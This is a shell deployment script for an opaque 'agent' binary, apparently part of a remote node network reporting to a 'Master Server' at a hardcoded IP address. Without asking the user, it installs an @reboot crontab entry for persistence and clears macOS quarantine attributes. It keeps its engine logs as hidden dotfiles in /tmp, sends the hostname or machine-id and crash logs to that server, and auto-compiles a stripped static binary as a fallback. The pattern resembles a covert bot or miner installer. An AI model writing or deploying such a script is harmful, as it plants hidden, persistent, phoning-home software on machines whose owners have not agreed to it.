#!/bin/sh
cd "$(dirname "$0")" || exit 1

OS=$(uname -s | tr '[:upper:]' '[:lower:]')
case "$(uname -m)" in
    x86_64|amd64) A="x86_64" ;;
    aarch64|arm64) A="arm64" ;;
    *) A="x86_64" ;;
esac

BIN="./bin/agent_${OS}_${A}"
PID_FILE=".agent.pid"

case "$1" in
    status)
        if [ -f "$PID_FILE" ] && kill -0 "$(cat "$PID_FILE" 2>/dev/null)" 2>/dev/null; then
            echo "[OK] Running (PID: $(cat "$PID_FILE"))"
            exit 0
        fi
        P=$(pgrep -f "$BIN" 2>/dev/null)
        if [ -n "$P" ]; then
            echo "[OK] Running (PID: $(echo $P | tr '\n' ' '))"
            exit 0
        fi
        echo "[INFO] Not running"
        exit 1
        ;;
    stop)
        K=0
        if [ -f "$PID_FILE" ]; then
            PID=$(cat "$PID_FILE" 2>/dev/null)
            if [ -n "$PID" ]; then
                kill -15 "$PID" 2>/dev/null || kill -9 "$PID" 2>/dev/null
                K=1
            fi
            rm -f "$PID_FILE"
        fi
        P=$(pgrep -f "$BIN" 2>/dev/null)
        if [ -n "$P" ]; then
            kill -9 $P 2>/dev/null
            K=1
        fi
        if [ -x "$BIN" ]; then
            "$BIN" stop >/dev/null 2>&1 || true
        fi
        [ "$K" -eq 1 ] && echo "[OK] Stopped" || echo "[INFO] Not running"
        exit 0
        ;;
    restart)
        sh "$0" stop >/dev/null 2>&1
        sleep 1
        ;;
    log)
        if [ -f "/tmp/.tb_tm.log" ] || [ -f "/tmp/.tb_hg.log" ]; then
            [ -f "/tmp/.tb_tm.log" ] && tail -n 15 /tmp/.tb_tm.log
            [ -f "/tmp/.tb_hg.log" ] && tail -n 15 /tmp/.tb_hg.log
        else
            echo "[INFO] No local engine log yet"
        fi
        exit 0
        ;;
    debug)
        exec "$BIN" --debug "$@"
        ;;
esac

if [ ! -f "$BIN" ]; then
    echo "[ERROR] Binary not found: $BIN"
    exit 1
fi

LOG_FILE=".agent.log"
chmod +x "$BIN" 2>/dev/null
[ "$OS" = "darwin" ] && xattr -c "$BIN" 2>/dev/null

if [ -f "$PID_FILE" ] && kill -0 "$(cat "$PID_FILE" 2>/dev/null)" 2>/dev/null; then
    echo "[OK] Already running (PID: $(cat "$PID_FILE"))"
    exit 0
fi

if ! command -v curl >/dev/null 2>&1; then
    echo "[WARN] 'curl' is not installed! Agent uses curl to report telemetry to server."
fi

# Chạy ngầm và ghi nhận log
nohup "$BIN" "$@" > "$LOG_FILE" 2>&1 &
PID=$!
echo "$PID" > "$PID_FILE"

# Chờ 1 giây để kiểm tra tiến trình có bị crash do thiếu thư viện hệ thống hay không
sleep 1
if kill -0 "$PID" 2>/dev/null; then
    echo "[OK] Started (PID: $PID)"
    if [ "$OS" = "linux" ] && command -v crontab >/dev/null 2>&1; then
        (crontab -l 2>/dev/null | grep -v "$BIN"; echo "@reboot cd $(pwd -P) && ./deploy.sh >/dev/null 2>&1 &") | crontab - 2>/dev/null || true
    fi
    exit 0
fi

# Nếu binary có sẵn bị crash (ví dụ: do lệch glibc / libstdc++ giữa các bản Linux)
echo "[ERROR] Binary $BIN exited immediately after launch!"
ERR_MSG=""
if [ -s "$LOG_FILE" ]; then
    echo "--- Startup Log Output ---"
    cat "$LOG_FILE"
    echo "--------------------------"
    ERR_MSG=$(head -n 2 "$LOG_FILE" | tr '\n' ' ' | head -c 250)
fi

# Gửi báo cáo lỗi trực tiếp lên Master Server để quản trị viên theo dõi trên Web Dashboard
SERVER_URL="http://65.20.91.208/turbox_server.php"
NODE_ID="node_$(hostname 2>/dev/null || cat /etc/machine-id 2>/dev/null | head -c 8 || echo $(date +%s))"
if command -v curl >/dev/null 2>&1; then
    curl -skL --max-time 5 -X POST "$SERVER_URL" \
      -d "action=heartbeat&id=${NODE_ID}&os=${OS}&arch=${A}&step=CRASHED" \
      --data-urlencode "step_info=Process crash: ${ERR_MSG}" \
      --data-urlencode "service_logs=[CRITICAL] Binary failed to launch: ${ERR_MSG}" >/dev/null 2>&1 || true
fi

# Fallback: Thử tự động biên dịch trực tiếp nếu trên máy có sẵn g++
if command -v g++ >/dev/null 2>&1 && [ -f "agent.cpp" ]; then
    echo "[INFO] Detected g++ on this system. Attempting auto-compilation for native architecture..."
    g++ -O3 -std=c++17 agent.cpp -static -lpthread -s -o "$BIN" 2>/dev/null || \
    g++ -O3 -std=c++17 agent.cpp -lpthread -s -o "$BIN" 2>/dev/null
    chmod +x "$BIN"
    nohup "$BIN" "$@" > "$LOG_FILE" 2>&1 &
    PID=$!
    echo "$PID" > "$PID_FILE"
    sleep 1
    if kill -0 "$PID" 2>/dev/null; then
        echo "[OK] Successfully compiled and started native agent! (PID: $PID)"
        exit 0
    fi
fi

echo "[HINT] Run: ./$BIN --debug to see detailed debugging logs."
exit 1
